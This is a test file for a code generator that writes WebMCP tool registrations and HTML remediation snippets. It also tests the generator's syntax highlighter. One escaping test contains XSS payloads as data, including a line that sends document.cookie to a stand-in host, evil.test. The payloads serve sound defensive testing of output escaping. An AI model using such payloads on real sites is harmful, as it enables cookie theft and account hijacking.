/**
 * Tests for the WebMCP code remediation engine and the syntax highlighter.
 *
 * The load-bearing assertion is syntax correctness: generated code is pasted
 * straight into someone's app, so every snippet is parsed with esbuild (JS and
 * TSX) or JSDOM (HTML) rather than merely string-matched.
 */

import { transformSync } from 'esbuild';
import { JSDOM } from 'jsdom';
import { beforeAll, describe, expect, it } from 'vitest';

import {
  classifyIssue,
  escapeAttribute,
  generateAllRemediations,
  generateRemediation,
  humanise,
  piercesShadowDom,
  playwrightToCss,
  schemaFromForm,
  toCamelCase,
  toKebabCase,
  toPascalCase,
  toSnakeCase,
  type RemediationBundle,
} from '../src/lib/codegen.js';
import { highlight, highlightLines } from '../src/lib/highlight.js';
import type { AuditIssue } from '../src/evals/types.js';
import { makeStudioFixture, type StudioFixture } from './helpers/studio-fixture.js';
import { makeField, makeForm } from './helpers/audit-factory.js';

let fixture: StudioFixture;
let bundles: RemediationBundle[];

beforeAll(async () => {
  fixture = await makeStudioFixture();
  bundles = fixture.scorecard.issues.map((issue) => generateRemediation(issue, fixture.data));
});

/** Parses `code`, throwing on a syntax error. */
function assertParses(code: string, loader: 'js' | 'tsx'): void {
  transformSync(code, { loader, target: 'es2022' });
}

describe('generateRemediation — structure', () => {
  it('produces three tabs for every issue on the scorecard', () => {
    expect(fixture.scorecard.issues.length).toBeGreaterThan(4);
    for (const bundle of bundles) {
      expect(bundle.tabs.map((tab) => tab.id)).toEqual([
        'browser-native',
        'react-hook',
        'declarative-html',
      ]);
      for (const tab of bundle.tabs) {
        expect(tab.code.trim().length).toBeGreaterThan(20);
        expect(tab.filename).toMatch(/\.(js|tsx|html)$/);
        expect(tab.explanation.length).toBeGreaterThan(20);
      }
      expect(bundle.summary.length).toBeGreaterThan(20);
    }
  });

  it('is deterministic', () => {
    const [issue] = fixture.scorecard.issues;
    expect(generateRemediation(issue, fixture.data)).toEqual(generateRemediation(issue, fixture.data));
  });

  it('generates a bundle for every issue, keyed by id', () => {
    const map = generateAllRemediations(fixture.scorecard.issues, fixture.data);
    expect(map.size).toBe(fixture.scorecard.issues.length);
    for (const issue of fixture.scorecard.issues) {
      expect(map.get(issue.id)?.issueId).toBe(issue.id);
    }
  });

  it('classifies issues onto the right remediation kind', () => {
    const kindOf = (id: string): string => classifyIssue({ id } as AuditIssue);
    expect(kindOf('discovery.missing-llms-txt')).toBe('descriptor');
    expect(kindOf('discovery.missing-well-known-mcp')).toBe('descriptor');
    expect(kindOf('discovery.missing-agent-card')).toBe('descriptor');
    expect(kindOf('safety.mislabelled-read-only-tools')).toBe('annotation');
    expect(kindOf('safety.missing-read-only-hints')).toBe('annotation');
    expect(kindOf('safety.missing-input-schemas')).toBe('schema');
    expect(kindOf('friction.unlabelled-input')).toBe('labelling');
    expect(kindOf('friction.opaque-iframe')).toBe('structural');
    expect(kindOf('actionability.uncovered-checkout-form-1')).toBe('surface-tool');
  });
});

describe('generateRemediation — syntax correctness', () => {
  it('emits parseable JavaScript on every browser-native tab', () => {
    for (const bundle of bundles) {
      const tab = bundle.tabs.find((entry) => entry.id === 'browser-native')!;
      expect(() => assertParses(tab.code, 'js'), `${bundle.issueId} browser-native`).not.toThrow();
    }
  });

  it('emits parseable TSX on every React hook tab', () => {
    for (const bundle of bundles) {
      const tab = bundle.tabs.find((entry) => entry.id === 'react-hook')!;
      expect(() => assertParses(tab.code, 'tsx'), `${bundle.issueId} react-hook`).not.toThrow();
    }
  });

  it('emits HTML that parses into the elements it claims', () => {
    for (const bundle of bundles) {
      const tab = bundle.tabs.find((entry) => entry.id === 'declarative-html')!;
      const dom = new JSDOM(`<body>${tab.code}</body>`);
      const body = dom.window.document.body;
      // Every non-comment node the snippet declares must survive parsing.
      const declared = (tab.code.match(/<(?!!)[a-zA-Z]/g) ?? []).length;
      if (declared > 0) {
        expect(body.querySelectorAll('*').length, `${bundle.issueId} html`).toBeGreaterThan(0);
      }
    }
  });

  it('emits JSON in descriptor snippets that actually parses', () => {
    const descriptorIssues = fixture.scorecard.issues.filter(
      (issue) => classifyIssue(issue) === 'descriptor',
    );
    expect(descriptorIssues.length).toBeGreaterThan(0);

    for (const issue of descriptorIssues) {
      const tab = generateRemediation(issue, fixture.data).tabs[0];
      const match = /=\s*(\{[\s\S]*\});/.exec(tab.code);
      if (match) expect(() => JSON.parse(match[1])).not.toThrow();
    }
  });

  it('cannot be made to emit a rogue attribute from a hostile label', () => {
    // Every one of these closes an attribute in some quoting context. The
    // generated snippet is code a developer pastes into their own site, so a
    // break-out here is stored XSS delivered through remediation advice.
    const payloads = [
      `x' onfocus='alert(document.cookie)' autofocus x`,
      `x" onmouseover="alert(1)" x`,
      `x'/><script>alert(1)</script><input a='`,
      `x"><img src=x onerror=alert(1)>`,
      `x' onload='fetch("//evil.test?c="+document.cookie)`,
    ];

    for (const payload of payloads) {
      const hostile = makeForm({
        id: 'form-evil',
        category: 'checkout',
        selector: 'form#evil',
        name: payload,
        fields: [makeField({ name: 'msg', accessibleName: payload })],
      });
      const data = { ...fixture.data, forms: [hostile, ...fixture.data.forms] };
      const issue: AuditIssue = {
        ...fixture.scorecard.issues[0],
        id: 'actionability.uncovered-checkout-form-evil',
        evidence: { formId: 'form-evil' },
        relatedSelectors: ['form#evil'],
      };

      const html = generateRemediation(issue, data).tabs[2].code;
      const dom = new JSDOM(`<body>${html}</body>`);
      const document = dom.window.document;

      // No element anywhere in the parsed output may carry an event handler,
      // autofocus, or an injected script/image tag.
      for (const element of Array.from(document.querySelectorAll('*'))) {
        const rogue = Array.from(element.attributes)
          .map((attribute) => attribute.name)
          .filter((name) => name.startsWith('on') || name === 'autofocus' || name === 'onerror');
        expect(rogue, `${payload} -> <${element.tagName.toLowerCase()}>`).toEqual([]);
      }
      expect(document.querySelector('script'), payload).toBeNull();
      expect(document.querySelector('img'), payload).toBeNull();

      // The snippet is still a usable form — the payload was escaped, not
      // stripped, so the developer can see what their page is actually serving.
      const form = document.querySelector('form[data-mcp-tool]');
      expect(form, payload).not.toBeNull();
    }
  });

  it('keeps the schema attribute parseable when the label contains both quotes', () => {
    const hostile = makeForm({
      id: 'form-q',
      category: 'checkout',
      selector: 'form#q',
      fields: [makeField({ name: 'msg', accessibleName: `it's a "quoted" label & <tag>` })],
    });
    const data = { ...fixture.data, forms: [hostile, ...fixture.data.forms] };
    const issue: AuditIssue = {
      ...fixture.scorecard.issues[0],
      id: 'actionability.uncovered-checkout-form-q',
      evidence: { formId: 'form-q' },
      relatedSelectors: ['form#q'],
    };

    const html = generateRemediation(issue, data).tabs[2].code;
    const form = new JSDOM(`<body>${html}</body>`).window.document.querySelector('form[data-mcp-tool]');

    expect(form).not.toBeNull();
    // The browser un-escapes on parse, so the round-trip must yield valid JSON
    // with the original label intact.
    const schema = JSON.parse(form!.getAttribute('data-mcp-schema') ?? '{}');
    expect(schema.properties.msg.description).toBe(`it's a "quoted" label & <tag>.`);
  });

  it('escapes values that would break out of generated syntax', () => {
    const hostile = makeForm({
      id: 'form-9',
      category: 'contact',
      name: 'Say "hello" <script>alert(1)</script> & goodbye',
      selector: 'form#hostile',
      fields: [makeField({ name: 'msg', accessibleName: 'A "quoted" label & <tag>' })],
    });
    const data = { ...fixture.data, forms: [hostile, ...fixture.data.forms] };
    const issue: AuditIssue = {
      ...fixture.scorecard.issues[0],
      id: 'actionability.uncovered-contact-form-9',
      evidence: { formId: 'form-9' },
      relatedSelectors: ['form#hostile'],
    };

    const bundle = generateRemediation(issue, data);
    const [native, hook, html] = bundle.tabs;
    expect(() => assertParses(native.code, 'js')).not.toThrow();
    expect(() => assertParses(hook.code, 'tsx')).not.toThrow();

    const dom = new JSDOM(`<body>${html.code}</body>`);
    // The script tag in the label must have been escaped into text, not parsed.
    expect(dom.window.document.querySelector('script')).toBeNull();
  });
});

describe('generateRemediation — inferred tools', () => {
  it('names and annotates a checkout surface as a destructive mutation', () => {
    const issue = fixture.scorecard.issues.find((entry) =>
      entry.id.startsWith('actionability.uncovered-checkout'),
    );
    // The checkout surface is covered by `place_order` in this fixture, so fall
    // back to the authentication surface, which is not.
    const target =
      issue ??
      fixture.scorecard.issues.find((entry) => entry.id.startsWith('actionability.uncovered-'))!;
    const bundle = generateRemediation(target, fixture.data);
    const code = bundle.tabs[0].code;

    expect(bundle.toolName).toMatch(/^(place_order|sign_in|create_account|search_products)$/);
    expect(code).toContain('navigator.modelContext.registerTool');
    expect(code).toContain('readOnlyHint');
  });

  it('mirrors real form fields into the input schema', () => {
    const form = makeForm({
      id: 'form-x',
      category: 'checkout',
      fields: [
        makeField({ name: 'email', type: 'email', accessibleName: 'Email address', required: true }),
        makeField({ name: 'quantity', type: 'number', accessibleName: 'Quantity' }),
        makeField({ name: 'gift-wrap', type: 'checkbox', accessibleName: 'Gift wrap' }),
        makeField({ name: 'secret', type: 'hidden', accessibleName: 'Hidden' }),
        makeField({ name: 'unnamed', type: 'text', accessibleName: null, labelSource: null }),
      ],
    });

    const schema = schemaFromForm(form);
    expect(schema.type).toBe('object');
    expect(schema.additionalProperties).toBe(false);
    expect(Object.keys(schema.properties)).toEqual(['email', 'quantity', 'giftWrap', 'unnamed']);
    expect(schema.properties.email).toEqual({
      type: 'string',
      description: 'Email address.',
      format: 'email',
    });
    expect(schema.properties.quantity.type).toBe('number');
    expect(schema.properties.giftWrap.type).toBe('boolean');
    expect(schema.required).toEqual(['email']);
    // An unlabelled field yields an honest placeholder, not an invented name.
    expect(schema.properties.unnamed.description).toContain('TODO');
  });

  it('marks a read-only query tool as read-only', () => {
    const searchIssue: AuditIssue = {
      ...fixture.scorecard.issues[0],
      id: 'actionability.uncovered-search-form-2',
      evidence: { formId: 'form-2', category: 'search' },
      relatedSelectors: ['div.search-box'],
    };
    const code = generateRemediation(searchIssue, fixture.data).tabs[0].code;
    expect(code).toContain('readOnlyHint: true');
    expect(code).toContain('destructiveHint: false');
  });

  it('corrects a tool mislabelled read-only rather than replacing it', () => {
    const issue = fixture.scorecard.issues.find(
      (entry) => entry.id === 'safety.mislabelled-read-only-tools',
    );
    expect(issue).toBeDefined();

    const bundle = generateRemediation(issue!, fixture.data);
    expect(bundle.toolName).toBe('place_order');
    expect(bundle.tabs[0].code).toContain('readOnlyHint: false');
    expect(bundle.tabs[0].code).toContain('destructiveHint: true');
  });
});

describe('generateRemediation — declarative HTML', () => {
  it('annotates the form with data-mcp-tool and matching field names', () => {
    const issue = fixture.scorecard.issues.find((entry) =>
      entry.id.startsWith('actionability.uncovered-'),
    )!;
    const html = generateRemediation(issue, fixture.data).tabs[2].code;
    const dom = new JSDOM(`<body>${html}</body>`);
    const form = dom.window.document.querySelector('form[data-mcp-tool]');

    expect(form).not.toBeNull();
    expect(form!.getAttribute('data-mcp-tool')).toBeTruthy();
    expect(form!.getAttribute('data-mcp-description')).toBeTruthy();
    expect(() => JSON.parse(form!.getAttribute('data-mcp-schema') ?? '')).not.toThrow();

    // Every input must be reachable from its label.
    for (const input of Array.from(form!.querySelectorAll('input'))) {
      const id = input.getAttribute('id');
      expect(id).toBeTruthy();
      expect(form!.querySelector(`label[for="${id}"]`)).not.toBeNull();
    }
  });

  it('emits an element-level fix for each trap type', () => {
    const trapIssues = fixture.scorecard.issues.filter((issue) => issue.pillar === 'friction');
    expect(trapIssues.length).toBeGreaterThan(1);

    for (const issue of trapIssues) {
      const html = generateRemediation(issue, fixture.data).tabs[2].code;
      expect(html, issue.id).toContain('AgentGrade remediation');
      expect(html.length, issue.id).toBeGreaterThan(80);
    }
  });
});

describe('selector helpers', () => {
  it('detects and strips shadow-DOM piercing selectors', () => {
    const piercing = 'body > checkout-widget >>> div.pay-button';
    expect(piercesShadowDom(piercing)).toBe(true);
    expect(playwrightToCss(piercing)).toBe('div.pay-button');

    const plain = 'section#checkout > input#coupon';
    expect(piercesShadowDom(plain)).toBe(false);
    expect(playwrightToCss(plain)).toBe(plain);
  });

  it('never emits a >>> selector into generated querySelector calls', () => {
    for (const bundle of bundles) {
      const native = bundle.tabs[0].code;
      const calls = native.match(/querySelector\("([^"]*)"\)/g) ?? [];
      for (const call of calls) expect(call, bundle.issueId).not.toContain('>>>');
    }
  });

  it('converts identifiers between casings', () => {
    expect(toCamelCase('gift-wrap')).toBe('giftWrap');
    expect(toCamelCase('card_number')).toBe('cardNumber');
    expect(toPascalCase('search_products')).toBe('SearchProducts');
    expect(toSnakeCase('searchProducts')).toBe('search_products');
    expect(toKebabCase('searchProducts')).toBe('search-products');
    expect(humanise('place_order')).toBe('Place order');
    expect(toCamelCase('')).toBe('');
    expect(humanise('')).toBe('');
  });

  it('escapes HTML attribute values', () => {
    expect(escapeAttribute('a "b" & <c>')).toBe('a &quot;b&quot; &amp; &lt;c&gt;');
  });
});

describe('highlight', () => {
  it('reproduces the input exactly when tokens are concatenated', () => {
    for (const bundle of bundles) {
      for (const tab of bundle.tabs) {
        const joined = highlight(tab.code, tab.language)
          .map((token) => token.value)
          .join('');
        expect(joined, `${bundle.issueId}/${tab.id}`).toBe(tab.code);
      }
    }
  });

  it('classifies the constructs a reader needs to see', () => {
    const tokens = highlight('const x = "hi"; // note\nawait run(42);', 'javascript');
    const typeOf = (value: string) => tokens.find((token) => token.value === value)?.type;
    expect(typeOf('const')).toBe('keyword');
    expect(typeOf('"hi"')).toBe('string');
    expect(typeOf('// note')).toBe('comment');
    expect(typeOf('await')).toBe('keyword');
    expect(typeOf('42')).toBe('number');
  });

  it('classifies HTML tags, attributes and values', () => {
    const tokens = highlight('<form data-mcp-tool="place_order"><!-- c --></form>', 'html');
    const types = new Set(tokens.map((token) => token.type));
    expect(types.has('tag')).toBe(true);
    expect(types.has('attribute')).toBe(true);
    expect(types.has('string')).toBe(true);
    expect(types.has('comment')).toBe(true);
  });

  it('distinguishes JSON keys from string values', () => {
    const tokens = highlight('{"name": "place_order", "n": 1, "ok": true}', 'json');
    expect(tokens.find((token) => token.value === '"name"')?.type).toBe('property');
    expect(tokens.find((token) => token.value === '"place_order"')?.type).toBe('string');
    expect(tokens.find((token) => token.value === 'true')?.type).toBe('literal');
  });

  it('splits into lines without losing characters', () => {
    const source = 'const a = 1;\n\nconst b = 2;\n';
    const lines = highlightLines(source, 'javascript');
    expect(lines.map((line) => line.map((token) => token.value).join('')).join('\n')).toBe(source);
  });

  it('survives unterminated strings and comments', () => {
    for (const broken of ['const a = "unterminated', '/* never closed', "'", '<div class="']) {
      expect(() => highlight(broken, 'javascript')).not.toThrow();
      expect(highlight(broken, 'javascript').map((token) => token.value).join('')).toBe(broken);
      expect(highlight(broken, 'html').map((token) => token.value).join('')).toBe(broken);
    }
  });
});
